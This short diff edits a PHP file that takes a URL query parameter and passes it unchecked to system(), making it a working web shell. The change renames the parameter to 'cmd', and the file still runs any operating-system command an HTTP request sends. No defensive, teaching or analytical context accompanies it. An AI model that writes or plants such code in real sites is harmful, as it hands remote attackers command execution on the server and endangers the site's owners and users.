@@ -1,4 +1,4 @@
 <?php
-$cmd = $_GET['text'];
+$cmd = $_GET['cmd'];
 system($cmd);
 ?>
